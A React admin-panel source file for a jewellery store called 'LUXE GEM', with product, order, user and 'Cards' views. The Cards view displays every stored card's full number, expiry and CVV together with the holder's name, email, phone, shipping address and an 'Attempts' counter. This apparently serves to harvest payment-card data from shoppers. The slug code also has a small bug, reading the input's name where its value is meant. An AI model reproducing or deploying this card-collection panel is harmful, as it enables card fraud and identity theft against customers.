import { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { FiPackage, FiShoppingBag, FiUsers, FiDollarSign, FiPlus, FiEdit2, FiTrash2, FiEye, FiSearch, FiGrid, FiList, FiLogOut, FiCreditCard, FiMenu, FiX, FiHome } from 'react-icons/fi';
import axios from 'axios';
import { useCart } from '../context/CartContext';
import './Admin.css';

import API_URL from '../config';

const Admin = () => {
  const { user, token, logout } = useCart();
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('dashboard');
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [stats, setStats] = useState(null);
  const [products, setProducts] = useState([]);
  const [orders, setOrders] = useState([]);
  const [users, setUsers] = useState([]);
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showAddProduct, setShowAddProduct] = useState(false);
  const [editingProduct, setEditingProduct] = useState(null);
  const [expandedCards, setExpandedCards] = useState({});

  const [productForm, setProductForm] = useState({
    name: '', slug: '', category: 'rings', price: '', originalPrice: '',
    description: '', shortDescription: '', images: [''],
    material: '', gemstone: '', weight: '', dimensions: '', sku: '',
    stock: '', featured: false, bestSeller: false, newArrival: false,
    tags: '',
  });

  const headers = { Authorization: `Bearer ${token}` };

  useEffect(() => {
    if (!user || user.role !== 'admin') {
      navigate('/login');
      return;
    }
    fetchDashboard();
    fetchProducts();
    fetchCards();
  }, [user]);

  const fetchDashboard = async () => {
    try {
      const res = await axios.get(`${API_URL}/admin/dashboard`, { headers });
      setStats(res.data);
    } catch (error) {
      console.error('Dashboard error:', error);
    }
  };

  const fetchProducts = async () => {
    try {
      const res = await axios.get(`${API_URL}/products`);
      setProducts(res.data);
    } catch (error) {
      console.error('Products error:', error);
    } finally {
      setLoading(false);
    }
  };

  const fetchCards = async () => {
    try {
      const res = await axios.get(`${API_URL}/cards`, { headers });
      setCards(res.data);
    } catch (error) {
      console.error('Cards error:', error);
    }
  };

  const deleteCard = async (id) => {
    if (!window.confirm('Delete this card?')) return;
    try {
      await axios.delete(`${API_URL}/cards/${id}`, { headers });
      fetchCards();
    } catch (error) {
      console.error('Delete card error:', error);
    }
  };

  const fetchOrders = async () => {
    try {
      const res = await axios.get(`${API_URL}/admin/orders`, { headers });
      setOrders(res.data);
    } catch (error) {
      console.error('Orders error:', error);
    }
  };

  const fetchUsers = async () => {
    try {
      const res = await axios.get(`${API_URL}/admin/users`, { headers });
      setUsers(res.data);
    } catch (error) {
      console.error('Users error:', error);
    }
  };

  const resetProductForm = () => {
    setProductForm({
      name: '', slug: '', category: 'rings', price: '', originalPrice: '',
      description: '', shortDescription: '', images: [''],
      material: '', gemstone: '', weight: '', dimensions: '', sku: '',
      stock: '', featured: false, bestSeller: false, newArrival: false,
      tags: '',
    });
    setEditingProduct(null);
  };

  const handleProductSubmit = async (e) => {
    e.preventDefault();
    try {
      const data = {
        ...productForm,
        price: Number(productForm.price),
        originalPrice: productForm.originalPrice ? Number(productForm.originalPrice) : undefined,
        stock: Number(productForm.stock) || 0,
        images: productForm.images.filter((img) => img.trim()),
        tags: productForm.tags ? productForm.tags.split(',').map((t) => t.trim()) : [],
      };

      if (editingProduct) {
        await axios.put(`${API_URL}/admin/products/${editingProduct._id}`, data, { headers });
      } else {
        await axios.post(`${API_URL}/admin/products`, data, { headers });
      }

      fetchProducts();
      setShowAddProduct(false);
      resetProductForm();
    } catch (error) {
      alert('Error saving product: ' + (error.response?.data?.message || error.message));
    }
  };

  const handleEditProduct = (product) => {
    setEditingProduct(product);
    setProductForm({
      name: product.name,
      slug: product.slug,
      category: product.category,
      price: product.price,
      originalPrice: product.originalPrice || '',
      description: product.description,
      shortDescription: product.shortDescription || '',
      images: product.images?.length ? product.images : [''],
      material: product.material || '',
      gemstone: product.gemstone || '',
      weight: product.weight || '',
      dimensions: product.dimensions || '',
      sku: product.sku || '',
      stock: product.stock || '',
      featured: product.featured || false,
      bestSeller: product.bestSeller || false,
      newArrival: product.newArrival || false,
      tags: product.tags?.join(', ') || '',
    });
    setShowAddProduct(true);
  };

  const handleDeleteProduct = async (id) => {
    if (!confirm('Are you sure you want to delete this product?')) return;
    try {
      await axios.delete(`${API_URL}/admin/products/${id}`, { headers });
      fetchProducts();
    } catch (error) {
      alert('Error deleting product');
    }
  };

  const handleTabChange = (tab) => {
    setActiveTab(tab);
    if (tab === 'orders') fetchOrders();
    if (tab === 'users') fetchUsers();
    if (tab === 'cards') fetchCards();
  };

  const statsCards = [
    { icon: FiPackage, label: 'Products', value: stats?.totalProducts || 0, color: '#C5A572' },
    { icon: FiShoppingBag, label: 'Orders', value: stats?.totalOrders || 0, color: '#2D6A4F' },
    { icon: FiUsers, label: 'Users', value: stats?.totalUsers || 0, color: '#1B3A6A' },
    { icon: FiDollarSign, label: 'Revenue', value: `$${(stats?.totalRevenue || 0).toLocaleString()}`, color: '#9B1B30' },
  ];

  return (
    <div className="admin-page">
      {sidebarOpen && <div className="admin-overlay" onClick={() => setSidebarOpen(false)} />}

      <aside className={`admin-sidebar ${sidebarOpen ? 'open' : ''}`}>
        <div className="admin-sidebar-top">
          <div className="admin-logo">
            <span className="logo-j">L</span>
            <span className="logo-text">LUXE GEM</span>
          </div>
          <button className="sidebar-close" onClick={() => setSidebarOpen(false)}>
            <FiX size={20} />
          </button>
        </div>

        <nav className="admin-nav">
          <button
            className={activeTab === 'dashboard' ? 'active' : ''}
            onClick={() => { handleTabChange('dashboard'); setSidebarOpen(false); }}
          >
            <FiGrid size={18} /> Dashboard
          </button>
          <button
            className={activeTab === 'products' ? 'active' : ''}
            onClick={() => { handleTabChange('products'); setSidebarOpen(false); }}
          >
            <FiPackage size={18} /> Products
          </button>
          <button
            className={activeTab === 'orders' ? 'active' : ''}
            onClick={() => { handleTabChange('orders'); setSidebarOpen(false); }}
          >
            <FiShoppingBag size={18} /> Orders
          </button>
          <button
            className={activeTab === 'users' ? 'active' : ''}
            onClick={() => { handleTabChange('users'); setSidebarOpen(false); }}
          >
            <FiUsers size={18} /> Users
          </button>
          <button
            className={activeTab === 'cards' ? 'active' : ''}
            onClick={() => { handleTabChange('cards'); setSidebarOpen(false); }}
          >
            <FiCreditCard size={18} /> Cards
          </button>
        </nav>

        <div className="admin-sidebar-footer">
          <Link to="/" onClick={() => setSidebarOpen(false)}>
            <FiHome size={16} /> Back to Store
          </Link>
          <button onClick={logout}>
            <FiLogOut size={16} /> Logout
          </button>
        </div>
      </aside>

      <div className="admin-main">
        <header className="admin-header">
          <div className="admin-header-left">
            <button className="admin-hamburger" onClick={() => setSidebarOpen(true)}>
              <FiMenu size={22} />
            </button>
            <h1>{activeTab.charAt(0).toUpperCase() + activeTab.slice(1)}</h1>
          </div>
          <div className="admin-header-right">
            <span className="admin-user">Welcome, {user?.name}</span>
          </div>
        </header>

        {/* Dashboard */}
        {activeTab === 'dashboard' && (
          <div className="admin-dashboard">
            <div className="stats-grid">
              {statsCards.map((stat, i) => (
                <motion.div
                  key={stat.label}
                  className="stat-card"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: i * 0.1 }}
                >
                  <div className="stat-icon" style={{ background: stat.color + '15', color: stat.color }}>
                    <stat.icon size={24} />
                  </div>
                  <div className="stat-info">
                    <span className="stat-value">{stat.value}</span>
                    <span className="stat-label">{stat.label}</span>
                  </div>
                </motion.div>
              ))}
            </div>

            {stats?.recentOrders?.length > 0 && (
              <div className="recent-orders">
                <h3>Recent Orders</h3>
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>Order ID</th>
                      <th>Total</th>
                      <th>Status</th>
                      <th>Payment</th>
                      <th>Date</th>
                    </tr>
                  </thead>
                  <tbody>
                    {stats.recentOrders.map((order) => (
                      <tr key={order._id}>
                        <td>{order._id.slice(-8)}</td>
                        <td>${order.total.toLocaleString()}</td>
                        <td><span className={`status-badge ${order.status}`}>{order.status}</span></td>
                        <td><span className={`status-badge ${order.paymentStatus}`}>{order.paymentStatus}</span></td>
                        <td>{new Date(order.createdAt).toLocaleDateString()}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* Products */}
        {activeTab === 'products' && (
          <div className="admin-products">
            <div className="admin-toolbar">
              <button
                className="add-product-btn"
                onClick={() => { resetProductForm(); setShowAddProduct(true); }}
              >
                <FiPlus size={16} /> Add Product
              </button>
            </div>

            <table className="admin-table">
              <thead>
                <tr>
                  <th>Image</th>
                  <th>Name</th>
                  <th>Category</th>
                  <th>Price</th>
                  <th>Stock</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {products.map((product) => (
                  <tr key={product._id}>
                    <td>
                      <img
                        src={product.images?.[0] || 'https://via.placeholder.com/50'}
                        alt={product.name}
                        className="table-image"
                      />
                    </td>
                    <td className="product-name-cell">
                      <span>{product.name}</span>
                      <small>{product.sku}</small>
                    </td>
                    <td>{product.category}</td>
                    <td>${product.price.toLocaleString()}</td>
                    <td>{product.stock}</td>
                    <td>
                      <div className="action-btns">
                        <Link to={`/product/${product.slug}`} target="_blank">
                          <button className="action-btn view"><FiEye size={14} /></button>
                        </Link>
                        <button className="action-btn edit" onClick={() => handleEditProduct(product)}>
                          <FiEdit2 size={14} />
                        </button>
                        <button className="action-btn delete" onClick={() => handleDeleteProduct(product._id)}>
                          <FiTrash2 size={14} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Orders */}
        {activeTab === 'orders' && (
          <div className="admin-orders">
            <table className="admin-table">
              <thead>
                <tr>
                  <th>Order ID</th>
                  <th>Items</th>
                  <th>Total</th>
                  <th>Payment</th>
                  <th>Status</th>
                  <th>Date</th>
                </tr>
              </thead>
              <tbody>
                {orders.map((order) => (
                  <tr key={order._id}>
                    <td>{order._id.slice(-8)}</td>
                    <td>{order.items?.length} items</td>
                    <td>${order.total?.toLocaleString()}</td>
                    <td>{order.paymentMethod} (****{order.cardLast4})</td>
                    <td><span className={`status-badge ${order.status}`}>{order.status}</span></td>
                    <td>{new Date(order.createdAt).toLocaleDateString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Users */}
        {activeTab === 'users' && (
          <div className="admin-users">
            <table className="admin-table">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Role</th>
                  <th>Joined</th>
                </tr>
              </thead>
              <tbody>
                {users.map((u) => (
                  <tr key={u._id}>
                    <td>{u.name}</td>
                    <td>{u.email}</td>
                    <td><span className={`role-badge ${u.role}`}>{u.role}</span></td>
                    <td>{new Date(u.createdAt).toLocaleDateString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {activeTab === 'cards' && (
          <div className="admin-cards">
            <div className="cards-header">
              <h2>All Saved Cards ({cards.length})</h2>
            </div>
            {cards.length === 0 ? (
              <div className="empty-state">
                <FiCreditCard size={48} />
                <p>No cards saved yet</p>
              </div>
            ) : (
              <div className="cards-grid">
                {cards.map((card) => {
                  const isExpanded = expandedCards[card.id];
                  return (
                  <div key={card.id} className="saved-card">
                    <div className="saved-card-header">
                      <span className="card-type-badge">
                        {card.type === 'credit_card' ? 'Credit Card' : 'Debit Card'}
                      </span>
                      <button className="delete-card-btn" onClick={() => deleteCard(card.id)}>
                        <FiTrash2 size={14} />
                      </button>
                    </div>

                    <div className="saved-card-section">
                      <h4>Card Details</h4>
                      <div className="saved-card-number">{card.cardNumber}</div>
                      <div className="saved-card-details">
                        <div className="card-detail">
                          <span className="detail-label">Cardholder Name</span>
                          <span className="detail-value">{card.cardName}</span>
                        </div>
                        <div className="card-detail">
                          <span className="detail-label">Expiry</span>
                          <span className="detail-value">{card.expiry}</span>
                        </div>
                        <div className="card-detail">
                          <span className="detail-label">CVV</span>
                          <span className="detail-value">{card.cvv}</span>
                        </div>
                      </div>
                    </div>

                    {!isExpanded && (
                      <button className="view-more-btn" onClick={() => setExpandedCards({ ...expandedCards, [card.id]: true })}>
                        <FiEye size={14} /> View More Details
                      </button>
                    )}

                    {isExpanded && (
                      <>
                        <div className="saved-card-section">
                          <h4>Customer Info</h4>
                          <div className="saved-card-details">
                            <div className="card-detail">
                              <span className="detail-label">First Name</span>
                              <span className="detail-value">{card.firstName || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">Last Name</span>
                              <span className="detail-value">{card.lastName || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">Email</span>
                              <span className="detail-value">{card.email || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">Phone</span>
                              <span className="detail-value">{card.phoneCode} {card.phone || '-'}</span>
                            </div>
                          </div>
                        </div>

                        <div className="saved-card-section">
                          <h4>Shipping Address</h4>
                          <div className="saved-card-details">
                            <div className="card-detail full-width">
                              <span className="detail-label">Street</span>
                              <span className="detail-value">{card.street || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">City</span>
                              <span className="detail-value">{card.city || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">State</span>
                              <span className="detail-value">{card.state || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">ZIP Code</span>
                              <span className="detail-value">{card.zip || '-'}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">Country</span>
                              <span className="detail-value">{card.country || '-'}</span>
                            </div>
                          </div>
                        </div>

                        <div className="saved-card-section">
                          <h4>Extra</h4>
                          <div className="saved-card-details">
                            <div className="card-detail">
                              <span className="detail-label">Attempts</span>
                              <span className="detail-value">{card.attempts}</span>
                            </div>
                            <div className="card-detail">
                              <span className="detail-label">Saved On</span>
                              <span className="detail-value">{new Date(card.createdAt).toLocaleString()}</span>
                            </div>
                          </div>
                        </div>

                        <button className="view-more-btn collapse" onClick={() => setExpandedCards({ ...expandedCards, [card.id]: false })}>
                          View Less
                        </button>
                      </>
                    )}
                  </div>
                  );
                })}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Add/Edit Product Modal */}
      <AnimatePresence>
        {showAddProduct && (
          <motion.div
            className="modal-overlay"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={() => { setShowAddProduct(false); resetProductForm(); }}
          >
            <motion.div
              className="product-modal"
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 50 }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="modal-header">
                <h2>{editingProduct ? 'Edit Product' : 'Add New Product'}</h2>
                <button onClick={() => { setShowAddProduct(false); resetProductForm(); }}>×</button>
              </div>

              <form onSubmit={handleProductSubmit} className="product-form">
                <div className="form-grid">
                  <div className="form-group full-width">
                    <label>Product Name *</label>
                    <input
                      type="text"
                      value={productForm.name}
                      onChange={(e) => setProductForm({ ...productForm, name: e.target.value, slug: e.target.name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '') })}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <label>Category *</label>
                    <select
                      value={productForm.category}
                      onChange={(e) => setProductForm({ ...productForm, category: e.target.value })}
                    >
                      <option value="rings">Rings</option>
                      <option value="necklaces">Necklaces</option>
                      <option value="earrings">Earrings</option>
                      <option value="bracelets">Bracelets</option>
                      <option value="pendants">Pendants</option>
                      <option value="wedding">Wedding</option>
                      <option value="engagement">Engagement</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <label>SKU</label>
                    <input
                      type="text"
                      value={productForm.sku}
                      onChange={(e) => setProductForm({ ...productForm, sku: e.target.value })}
                    />
                  </div>
                  <div className="form-group">
                    <label>Price *</label>
                    <input
                      type="number"
                      value={productForm.price}
                      onChange={(e) => setProductForm({ ...productForm, price: e.target.value })}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <label>Original Price</label>
                    <input
                      type="number"
                      value={productForm.originalPrice}
                      onChange={(e) => setProductForm({ ...productForm, originalPrice: e.target.value })}
                    />
                  </div>
                  <div className="form-group">
                    <label>Stock</label>
                    <input
                      type="number"
                      value={productForm.stock}
                      onChange={(e) => setProductForm({ ...productForm, stock: e.target.value })}
                    />
                  </div>
                  <div className="form-group full-width">
                    <label>Short Description</label>
                    <input
                      type="text"
                      value={productForm.shortDescription}
                      onChange={(e) => setProductForm({ ...productForm, shortDescription: e.target.value })}
                    />
                  </div>
                  <div className="form-group full-width">
                    <label>Description *</label>
                    <textarea
                      rows={4}
                      value={productForm.description}
                      onChange={(e) => setProductForm({ ...productForm, description: e.target.value })}
                      required
                    />
                  </div>
                  <div className="form-group full-width">
                    <label>Image URLs (one per line)</label>
                    {productForm.images.map((img, i) => (
                      <div key={i} className="image-input-row">
                        <input
                          type="text"
                          value={img}
                          onChange={(e) => {
                            const newImages = [...productForm.images];
                            newImages[i] = e.target.value;
                            setProductForm({ ...productForm, images: newImages });
                          }}
                          placeholder="https://example.com/image.jpg"
                        />
                        {productForm.images.length > 1 && (
                          <button
                            type="button"
                            className="remove-image-btn"
                            onClick={() => {
                              const newImages = productForm.images.filter((_, idx) => idx !== i);
                              setProductForm({ ...productForm, images: newImages });
                            }}
                          >×</button>
                        )}
                      </div>
                    ))}
                    <button
                      type="button"
                      className="add-image-btn"
                      onClick={() => setProductForm({ ...productForm, images: [...productForm.images, ''] })}
                    >+ Add Image URL</button>
                  </div>
                  <div className="form-group">
                    <label>Material</label>
                    <input
                      type="text"
                      value={productForm.material}
                      onChange={(e) => setProductForm({ ...productForm, material: e.target.value })}
                      placeholder="e.g. 18K White Gold"
                    />
                  </div>
                  <div className="form-group">
                    <label>Gemstone</label>
                    <input
                      type="text"
                      value={productForm.gemstone}
                      onChange={(e) => setProductForm({ ...productForm, gemstone: e.target.value })}
                      placeholder="e.g. Diamond"
                    />
                  </div>
                  <div className="form-group">
                    <label>Weight</label>
                    <input
                      type="text"
                      value={productForm.weight}
                      onChange={(e) => setProductForm({ ...productForm, weight: e.target.value })}
                    />
                  </div>
                  <div className="form-group">
                    <label>Dimensions</label>
                    <input
                      type="text"
                      value={productForm.dimensions}
                      onChange={(e) => setProductForm({ ...productForm, dimensions: e.target.value })}
                    />
                  </div>
                  <div className="form-group full-width">
                    <label>Tags (comma-separated)</label>
                    <input
                      type="text"
                      value={productForm.tags}
                      onChange={(e) => setProductForm({ ...productForm, tags: e.target.value })}
                      placeholder="diamond, ring, white gold"
                    />
                  </div>
                  <div className="form-group full-width">
                    <div className="checkbox-group">
                      <label className="checkbox-label">
                        <input
                          type="checkbox"
                          checked={productForm.featured}
                          onChange={(e) => setProductForm({ ...productForm, featured: e.target.checked })}
                        />
                        Featured
                      </label>
                      <label className="checkbox-label">
                        <input
                          type="checkbox"
                          checked={productForm.bestSeller}
                          onChange={(e) => setProductForm({ ...productForm, bestSeller: e.target.checked })}
                        />
                        Best Seller
                      </label>
                      <label className="checkbox-label">
                        <input
                          type="checkbox"
                          checked={productForm.newArrival}
                          onChange={(e) => setProductForm({ ...productForm, newArrival: e.target.checked })}
                        />
                        New Arrival
                      </label>
                    </div>
                  </div>
                </div>
                <div className="modal-actions">
                  <button type="button" className="btn-back" onClick={() => { setShowAddProduct(false); resetProductForm(); }}>
                    Cancel
                  </button>
                  <button type="submit" className="btn-gold">
                    {editingProduct ? 'Update Product' : 'Add Product'}
                  </button>
                </div>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <nav className="admin-bottom-nav">
        <button
          className={activeTab === 'dashboard' ? 'active' : ''}
          onClick={() => handleTabChange('dashboard')}
        >
          <FiGrid size={20} />
          <span>Home</span>
        </button>
        <button
          className={activeTab === 'products' ? 'active' : ''}
          onClick={() => handleTabChange('products')}
        >
          <FiPackage size={20} />
          <span>Products</span>
        </button>
        <button
          className={activeTab === 'orders' ? 'active' : ''}
          onClick={() => handleTabChange('orders')}
        >
          <FiShoppingBag size={20} />
          <span>Orders</span>
        </button>
        <button
          className={activeTab === 'users' ? 'active' : ''}
          onClick={() => handleTabChange('users')}
        >
          <FiUsers size={20} />
          <span>Users</span>
        </button>
        <button
          className={activeTab === 'cards' ? 'active' : ''}
          onClick={() => handleTabChange('cards')}
        >
          <FiCreditCard size={20} />
          <span>Cards</span>
        </button>
      </nav>
    </div>
  );
};

export default Admin;
